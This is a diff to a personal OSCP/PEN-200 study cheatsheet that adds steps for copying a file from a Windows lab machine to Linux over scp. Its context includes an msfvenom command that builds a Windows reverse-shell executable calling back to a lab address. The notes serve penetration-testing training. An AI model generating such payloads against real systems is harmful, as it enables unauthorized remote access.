@@ -4,7 +4,12 @@ Cheatsheet/Notes from PEN-200 Learning Platform for the OSCP Exam
 Payload Generator msfvenom:
 
     msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
+Transfer File From Windows To Linux via ssh:
+    1.on linux 2. on windows:
     
+        1. sudo systemctl start ssh
+        2. scp C:\Users\offsec\Desktop\malware.exe shaleph@192.168.45.162:/home/shaleph/OSCP 
+        
 file metadata analyzer:
 
     exiftool -a -u <file.name>
